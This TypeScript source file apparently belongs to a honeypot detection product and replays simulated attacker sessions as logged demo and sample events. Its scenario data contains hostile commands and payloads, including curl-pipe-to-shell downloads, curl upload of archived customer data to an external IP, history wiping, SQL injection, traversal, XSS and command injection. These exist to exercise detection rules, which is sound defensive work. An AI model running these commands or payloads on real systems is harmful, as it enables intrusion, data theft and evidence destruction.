import { randomInt } from 'node:crypto';
import { and, sql as dsql, eq, inArray } from 'drizzle-orm';
import type { FastifyInstance, FastifyRequest } from 'fastify';
import { ulid } from 'ulid';
import { z } from 'zod';
import { db } from '../db/client.js';
import { events } from '../db/schema.js';
import { env } from '../env.js';
import { audit } from '../lib/audit.js';
import { conflict, HttpError } from '../lib/errors.js';
import { parse } from '../lib/parse.js';
import { projectAccess, requireSession } from '../plugins/auth-session.js';
import { ingestEvents } from './ingest.js';

type Ev = Record<string, unknown>;
type Step = { gap: number; ev: Ev };

const web = (decoy: string, url: string, extra: Ev = {}): Ev => ({
  sensor: 'web',
  decoy_id: decoy,
  is_decoy: true,
  dst_service: `http:${url}`,
  event_type: 'http.request',
  method: 'GET',
  url,
  status_code: 200,
  ...extra,
});
const ssh = (type: string, extra: Ev = {}): Ev => ({
  sensor: 'ssh',
  decoy_id: 'ssh-db-backup-01',
  is_decoy: true,
  dst_service: 'ssh:22',
  event_type: type,
  ...extra,
});

const SQLMAP_UA = 'sqlmap/1.7#stable';
const FIREFOX_UA = 'Mozilla/5.0 (X11; Linux x86_64) Firefox/126.0';
const HYDRA_UA = 'hydra/9.5';
const NIKTO_UA = 'Mozilla/5.0 (Nikto/2.5.0)';

/** A web login attempt against the admin decoy, as the agent normalises it. */
const webAuth = (outcome: 'success' | 'failure', extra: Ev = {}): Ev => ({
  sensor: 'web',
  decoy_id: 'web-admin-admin',
  is_decoy: true,
  dst_service: 'http:/admin/login',
  event_type: 'auth.attempt',
  method: 'POST',
  url: '/admin/login',
  outcome,
  ...extra,
});
/**
 * The token the `honeytoken` replay plants and then uses. Nothing joins this to
 * the `honeytokens` table — process-events stamps `first_used_at` by id and the
 * update is a harmless no-op when no such row was declared by an agent.
 */
const DEMO_HONEYTOKEN_ID = 'ht-acme-payments-key';

const SCENARIOS: Record<string, (ip: string) => Step[]> = {
  targeted: () => [
    {
      gap: 0,
      ev: web('web-admin-admin', '/admin', {
        user_agent: 'Mozilla/5.0 (X11; Linux x86_64) Firefox/126.0',
      }),
    },
    {
      gap: 7,
      ev: web('web-bait-env', '/.env', {
        user_agent: 'Mozilla/5.0 (X11; Linux x86_64) Firefox/126.0',
        outcome: 'success',
      }),
    },
    { gap: 9, ev: ssh('ssh.client', { client_banner: 'SSH-2.0-OpenSSH_9.6' }) },
    {
      gap: 6,
      ev: ssh('auth.attempt', { username: 'deploy', password_masked: 'W***1', outcome: 'failure' }),
    },
    {
      gap: 8,
      ev: ssh('auth.attempt', { username: 'admin', password_clear: 'admin', outcome: 'success' }),
    },
    {
      gap: 11,
      ev: ssh('command.exec', { username: 'admin', command: 'whoami', outcome: 'success' }),
    },
    {
      gap: 8,
      ev: ssh('command.exec', { username: 'admin', command: 'uname -a && id', outcome: 'success' }),
    },
    {
      gap: 14,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'ls -la /srv/exports',
        outcome: 'success',
      }),
    },
    {
      gap: 12,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'cat /srv/exports/customer_data.csv',
        outcome: 'success',
      }),
    },
    {
      gap: 9,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'wget http://198.51.100.23/x.sh -O /tmp/x.sh',
        outcome: 'failure',
      }),
    },
    {
      gap: 16,
      ev: {
        sensor: 'sdk',
        is_decoy: false,
        dst_service: 'app:/api/payments',
        event_type: 'asset.access',
        asset_name: 'Payments API',
        method: 'GET',
        url: '/api/payments/export',
        status_code: 200,
        outcome: 'success',
      },
    },
  ],
  opportunistic: () => [
    { gap: 0, ev: ssh('ssh.client', { client_banner: 'SSH-2.0-libssh_0.9.6' }) },
    ...['root', 'admin', 'ubuntu', 'test', 'oracle'].map(
      (u): Step => ({
        gap: 1,
        ev: ssh('auth.attempt', { username: u, password_masked: '1****6', outcome: 'failure' }),
      }),
    ),
    {
      gap: 1,
      ev: ssh('auth.attempt', { username: 'root', password_clear: 'toor', outcome: 'success' }),
    },
    {
      gap: 1,
      ev: ssh('command.exec', { username: 'root', command: 'uname -a', outcome: 'success' }),
    },
    {
      gap: 1,
      ev: ssh('command.exec', {
        username: 'root',
        command: 'cat /proc/cpuinfo',
        outcome: 'success',
      }),
    },
    {
      gap: 1,
      ev: ssh('command.exec', {
        username: 'root',
        command: 'curl -s http://198.51.100.99/m.sh | sh',
        outcome: 'failure',
      }),
    },
  ],
  noise: () => [
    { gap: 0, ev: web('web-admin-admin', '/', { user_agent: 'zgrab/0.x' }) },
    {
      gap: 1,
      ev: web('web-bait-env', '/robots.txt', { user_agent: 'zgrab/0.x', status_code: 404 }),
    },
    {
      gap: 1,
      ev: web('web-admin-admin', '/favicon.ico', { user_agent: 'zgrab/0.x', status_code: 404 }),
    },
  ],
  // Mirrors attacker-demo/attacker-api/scenarios/sqli.json: an sqlmap-style spray
  // of SQLi and traversal payloads at decoy paths. The strings are logged, never
  // executed; they exist so R05 fires once per exploit family.
  sqli: () => [
    {
      gap: 0,
      ev: web('web-admin-admin', "/products?id=1' OR '1'='1", {
        user_agent: SQLMAP_UA,
        status_code: 404,
      }),
    },
    {
      gap: 1,
      ev: web('web-admin-admin', '/products?id=1 UNION SELECT NULL,NULL,NULL--', {
        user_agent: SQLMAP_UA,
        status_code: 404,
      }),
    },
    {
      gap: 1,
      ev: web('web-bait-env', '/../../../../etc/passwd', {
        user_agent: SQLMAP_UA,
        status_code: 404,
      }),
    },
    {
      gap: 1,
      ev: web('web-admin-admin', '/admin?id=1;DROP TABLE users;--', {
        user_agent: SQLMAP_UA,
        status_code: 200,
      }),
    },
  ],
  // Mirrors attacker-demo/attacker-api/scenarios/exfil-cleanup.json: post-exploitation
  // with anti-forensics. Default-cred login (R06), archive + read the bait exports
  // (R11/R18), curl them to an external host (R09 transfer), then wipe history and logs
  // — the only scenario that reaches defence evasion (R17).
  'exfil-cleanup': () => [
    { gap: 0, ev: ssh('ssh.client', { client_banner: 'SSH-2.0-OpenSSH_9.6' }) },
    {
      gap: 6,
      ev: ssh('auth.attempt', { username: 'admin', password_clear: 'admin', outcome: 'success' }),
    },
    {
      gap: 8,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'tar -czf /tmp/loot.tgz /srv/exports',
        outcome: 'success',
      }),
    },
    {
      gap: 7,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'cat /srv/exports/customer_data.csv',
        outcome: 'success',
      }),
    },
    {
      gap: 9,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'curl -T /tmp/loot.tgz http://198.51.100.9/',
        outcome: 'success',
      }),
    },
    {
      gap: 11,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'history -c; rm -f ~/.bash_history; unset HISTFILE',
        outcome: 'success',
      }),
    },
  ],
  dynamic: () => [
    { gap: 0, ev: ssh('ssh.client', { client_banner: 'SSH-2.0-OpenSSH_9.6' }) },
    {
      gap: 5,
      ev: ssh('auth.attempt', { username: 'admin', password_clear: 'admin', outcome: 'success' }),
    },
    {
      gap: 7,
      ev: ssh('command.exec', {
        username: 'admin',
        command: 'cowsay deployment window',
        outcome: 'success',
      }),
    },
    {
      gap: 9,
      ev: ssh('command.exec', {
        username: 'admin',
        command: './inventory-probe --format compact',
        outcome: 'success',
      }),
    },
  ],
  // Mirrors attacker-demo/attacker-api/scenarios/web-exploit.json: a nikto-style sweep
  // carrying four exploit families — XSS, command injection, traversal and SQLi. R05
  // detects each (+10) but is capped at 20 (RULE_POINT_CAPS.R05), so two families show
  // in the ledger; the nikto user-agent trips R03.
  'web-exploit': () => [
    {
      gap: 0,
      ev: web('web-admin-admin', '/search?q=<script>alert(1)</script>', {
        user_agent: NIKTO_UA,
        status_code: 404,
      }),
    },
    {
      gap: 1,
      ev: web('web-admin-admin', '/ping?host=127.0.0.1;cat /etc/passwd', {
        user_agent: NIKTO_UA,
        status_code: 404,
      }),
    },
    {
      gap: 1,
      ev: web('web-admin-admin', "/products?id=1' OR '1'='1", {
        user_agent: NIKTO_UA,
        status_code: 404,
      }),
    },
  ],
  // Mirrors attacker-demo/attacker-api/scenarios/web-bruteforce.json: a hydra-style
  // credential-stuffing burst at the /admin login. Six failures inside 60 s trip R04;
  // the default admin/admin then succeeds (R06). The hydra user-agent trips R03.
  'web-bruteforce': () => [
    { gap: 0, ev: web('web-admin-admin', '/admin', { user_agent: HYDRA_UA }) },
    ...Array.from(
      { length: 6 },
      (): Step => ({
        gap: 2,
        ev: webAuth('failure', {
          user_agent: HYDRA_UA,
          username: 'admin',
          password_masked: 'P*******1',
        }),
      }),
    ),
    {
      gap: 2,
      ev: webAuth('success', {
        user_agent: HYDRA_UA,
        username: 'admin',
        password_clear: 'admin',
      }),
    },
  ],
  // Mirrors attacker-demo/attacker-api/scenarios/honeytoken.json: the bait file is
  // served from a decoy, then the stolen token is used against a real asset. The
  // second event is what makes this Critical — R16 carries floor: 'critical'.
  honeytoken: () => [
    {
      gap: 0,
      ev: web('web-bait-env', '/.env', { user_agent: FIREFOX_UA, outcome: 'success' }),
    },
    {
      gap: 14,
      ev: {
        sensor: 'sdk',
        is_decoy: false,
        dst_service: 'app:/api/payments',
        event_type: 'honeytoken.use',
        honeytoken_id: DEMO_HONEYTOKEN_ID,
        asset_name: 'Payments API',
        method: 'GET',
        url: '/api/payments',
        status_code: 200,
        outcome: 'success',
      },
    },
  ],
};

/**
 * Public scenario names the clients send, mapped onto the canonical replays above.
 * The dashboard's replay button sends `ps-use-case`; the attacker console's safe
 * mode sends the id of whichever scenario was clicked (`ps-attacker`, `sqli`,
 * `honeytoken`, `noise`, `opportunistic`). Both PS names describe the same
 * targeted story as `targeted` — probe, brute force, read decoy data, touch the
 * real asset — so they alias onto it. Everything else has its own entry, because
 * silently substituting `targeted` is what made safe mode replay the wrong story.
 */
const SCENARIO_ALIASES: Record<string, string> = {
  'ps-use-case': 'targeted',
  'ps-attacker': 'targeted',
};

/** Every name a client may send, for the error when it sends something else. */
const SCENARIO_NAMES = [...Object.keys(SCENARIOS), ...Object.keys(SCENARIO_ALIASES)].sort();

/**
 * Resolve a client-supplied scenario name to a canonical one, or reject it by
 * name. `Object.hasOwn`, not `in`: `in` would accept inherited keys such as
 * `constructor` and then call a non-scenario off the prototype.
 */
export function resolveScenario(requested: string): string {
  const canonical = SCENARIO_ALIASES[requested] ?? requested;
  if (!Object.hasOwn(SCENARIOS, canonical))
    throw new HttpError(422, 'unknown_scenario', `Unknown replay scenario "${requested}"`, {
      requested,
      accepted: SCENARIO_NAMES,
    });
  return canonical;
}

/**
 * Build the batch a replay ingests: the scenario's events wrapped in the envelope
 * ingest requires, re-timed so the last event lands at `now` and earlier ones are
 * spread backwards by their gaps. `scenario` is resolved again so this is safe to
 * call with any client-supplied name.
 */
export function buildReplayEvents(
  scenario: string,
  ip: string,
  now = Date.now(),
  sessionPrefix = 'demo',
): Ev[] {
  const steps = SCENARIOS[resolveScenario(scenario)]!(ip);
  const total = steps.reduce((s, x) => s + x.gap, 0);
  let t = now - total * 1000;
  const session = `${sessionPrefix}-${ulid().slice(-8)}`;
  return steps.map((s) => {
    t += s.gap * 1000;
    return {
      id: ulid(t),
      schema_version: 1,
      timestamp: new Date(t).toISOString(),
      src_ip: ip,
      session_id: session,
      count: 1,
      simulated: true,
      ...s.ev,
    };
  });
}

const Body = z.object({
  scenario: z.string().max(64).default('targeted'),
  scenarioId: z.string().max(64).optional(),
  src_ip: z.union([z.ipv4(), z.ipv6()]).optional(),
});

export async function demoRoutes(app: FastifyInstance): Promise<void> {
  app.post('/v1/projects/:pid/demo/replay', { preHandler: requireSession }, async (req, reply) => {
    const { project, user } = await projectAccess(
      req,
      (req.params as { pid: string }).pid,
      'owner',
    );
    if (!env.DEMO_MODE && !['demo', 'dev', 'development'].includes(project.environment)) {
      throw new HttpError(
        403,
        'not_demo_project',
        'Replay is only available for demo projects (environment=demo)',
      );
    }
    const body = parse(Body, req.body ?? {});
    const requestedScenario = body.scenarioId ?? body.scenario;
    const scenario = resolveScenario(requestedScenario);
    const ip = body.src_ip ?? `203.0.113.${randomInt(2, 250)}`;
    const raw = buildReplayEvents(scenario, ip);
    const res = await ingestEvents({ projectId: project.id, rawEvents: raw });
    await audit(db, {
      orgId: project.orgId,
      projectId: project.id,
      actorType: 'user',
      actorId: user.id,
      action: 'demo.replay',
      metadata: { scenario, requested_scenario: requestedScenario, src_ip: ip },
      req,
    });
    return reply.status(202).send({
      scenario,
      src_ip: ip,
      accepted: res.accepted,
      duplicates: res.duplicates,
      rejected: res.rejected,
    });
  });

  await firstRunRoutes(app);
}

/* ───────────────────────── first run: test hit and sample data ─────────────────────────
 * Both reuse the replay machinery above, on any project (not only demo ones), with fixed
 * scenarios and addresses from the documentation ranges, so they can never be mistaken for
 * (or collide with) a real source. Every event is `simulated`; sample data is also `sample`,
 * which is what "Clear sample data" deletes. Incident summaries surface both flags.
 */

/** One safe, short story that always opens an incident: a hydra-style burst at /admin ending on admin/admin. */
export const TEST_HIT_SCENARIO = 'web-bruteforce';
/** Test hits come from TEST-NET-3 (RFC 5737), like the demo replays. */
export const testHitIp = (): string => `203.0.113.${randomInt(2, 250)}`;

/** The canned stories behind sample data, each from its own TEST-NET-1 address. */
export const SAMPLE_SET: ReadonlyArray<{ scenario: string; ip: string; minutesAgo: number }> = [
  { scenario: 'targeted', ip: '192.0.2.10', minutesAgo: 42 },
  { scenario: 'opportunistic', ip: '192.0.2.24', minutesAgo: 27 },
  { scenario: 'web-exploit', ip: '192.0.2.37', minutesAgo: 15 },
  { scenario: 'noise', ip: '192.0.2.51', minutesAgo: 4 },
];

export function buildSampleEvents(now = Date.now()): Ev[] {
  return SAMPLE_SET.flatMap((s) =>
    buildReplayEvents(s.scenario, s.ip, now - s.minutesAgo * 60_000, 'sample'),
  );
}

/** Per project, not per IP: a team sharing a NAT should not exhaust each other's budget. */
export const FIRST_RUN_LIMIT = { max: 5, timeWindow: '1 hour' } as const;
const perProject = (what: 'test-hit' | 'sample-data') => ({
  rateLimit: {
    ...FIRST_RUN_LIMIT,
    keyGenerator: (req: FastifyRequest) => `${what}:${(req.params as { pid?: string }).pid ?? ''}`,
    errorResponseBuilder: (_req: unknown, ctx: { max: number; after: string }) => ({
      statusCode: 429,
      code: 'rate_limited',
      message: `${what === 'test-hit' ? 'Test hits' : 'Sample data loads'} are limited to ${ctx.max} per hour per project. Retry in ${ctx.after}.`,
    }),
  },
});

export interface SampleStatus {
  loaded: boolean;
  sample_events: number;
  sample_incidents: number;
  real_events: number;
}

export async function sampleStatus(projectId: string): Promise<SampleStatus> {
  const [row] = (await db.execute(dsql`
    select
      (select count(*) from events where project_id = ${projectId}::uuid and sample)::int as sample_events,
      (select count(distinct incident_id) from events where project_id = ${projectId}::uuid and sample and incident_id is not null)::int as sample_incidents,
      (select count(*) from events where project_id = ${projectId}::uuid and not simulated)::int as real_events
  `)) as unknown as Omit<SampleStatus, 'loaded'>[];
  const r = row ?? { sample_events: 0, sample_incidents: 0, real_events: 0 };
  return { loaded: r.sample_events > 0, ...r };
}

/**
 * Deletes sample events, then incidents and attackers that only sample events built. One
 * statement, so it is atomic. The `not e.sample` guards see the pre-delete snapshot: an
 * incident or attacker that also has real events is kept (and only loses the sample ones).
 */
export async function clearSampleData(
  projectId: string,
): Promise<{ events: number; incidents: number; attackers: number }> {
  const [row] = (await db.execute(dsql`
    with ev as (
      delete from events where project_id = ${projectId}::uuid and sample
      returning incident_id, attacker_id
    ), inc as (
      delete from incidents i
      where i.project_id = ${projectId}::uuid
        and i.id in (select incident_id from ev where incident_id is not null)
        and not exists (select 1 from events e where e.incident_id = i.id and not e.sample)
      returning i.id
    ), att as (
      delete from attackers a
      where a.project_id = ${projectId}::uuid
        and a.id in (select attacker_id from ev where attacker_id is not null)
        and not exists (select 1 from events e where e.attacker_id = a.id and not e.sample)
      returning a.id
    )
    select (select count(*) from ev)::int as events,
           (select count(*) from inc)::int as incidents,
           (select count(*) from att)::int as attackers
  `)) as unknown as { events: number; incidents: number; attackers: number }[];
  return row ?? { events: 0, incidents: 0, attackers: 0 };
}

export async function firstRunRoutes(app: FastifyInstance): Promise<void> {
  const pid = (req: FastifyRequest) => (req.params as { pid: string }).pid;

  app.post(
    '/v1/projects/:pid/demo/test-hit',
    { preHandler: requireSession, config: perProject('test-hit') },
    async (req, reply) => {
      const { project, user } = await projectAccess(req, pid(req), 'analyst');
      const ip = testHitIp();
      const raw = buildReplayEvents(TEST_HIT_SCENARIO, ip, Date.now(), 'test');
      const res = await ingestEvents({ projectId: project.id, rawEvents: raw });
      await audit(db, {
        orgId: project.orgId,
        projectId: project.id,
        actorType: 'user',
        actorId: user.id,
        action: 'demo.test_hit',
        metadata: { scenario: TEST_HIT_SCENARIO, src_ip: ip, events: res.accepted },
        req,
      });
      return reply.status(202).send({
        test: true,
        scenario: TEST_HIT_SCENARIO,
        src_ip: ip,
        session_id: raw[0]?.session_id ?? null,
        accepted: res.accepted,
        sent_at: new Date().toISOString(),
      });
    },
  );

  app.get('/v1/projects/:pid/demo/sample-data', { preHandler: requireSession }, async (req) => {
    const { project } = await projectAccess(req, pid(req));
    return sampleStatus(project.id);
  });

  app.post(
    '/v1/projects/:pid/demo/sample-data',
    { preHandler: requireSession, config: perProject('sample-data') },
    async (req, reply) => {
      const { project, user } = await projectAccess(req, pid(req), 'analyst');
      const before = await sampleStatus(project.id);
      if (before.loaded) throw conflict('Sample data is already loaded; clear it first');
      const raw = buildSampleEvents();
      const res = await ingestEvents({ projectId: project.id, rawEvents: raw });
      // ingest has no notion of "sample"; tag what it stored. The worker never reads this column,
      // so it does not matter whether it has already picked the events up.
      if (res.eventIds.length > 0)
        await db
          .update(events)
          .set({ sample: true })
          .where(and(eq(events.projectId, project.id), inArray(events.id, res.eventIds)));
      await audit(db, {
        orgId: project.orgId,
        projectId: project.id,
        actorType: 'user',
        actorId: user.id,
        action: 'demo.sample_loaded',
        metadata: { scenarios: SAMPLE_SET.map((s) => s.scenario), events: res.accepted },
        req,
      });
      return reply.status(202).send({
        sample: true,
        scenarios: SAMPLE_SET.map((s) => ({ scenario: s.scenario, src_ip: s.ip })),
        accepted: res.accepted,
      });
    },
  );

  app.delete('/v1/projects/:pid/demo/sample-data', { preHandler: requireSession }, async (req) => {
    const { project, user } = await projectAccess(req, pid(req), 'analyst');
    const deleted = await clearSampleData(project.id);
    await audit(db, {
      orgId: project.orgId,
      projectId: project.id,
      actorType: 'user',
      actorId: user.id,
      action: 'demo.sample_cleared',
      metadata: deleted,
      req,
    });
    return { deleted };
  });
}
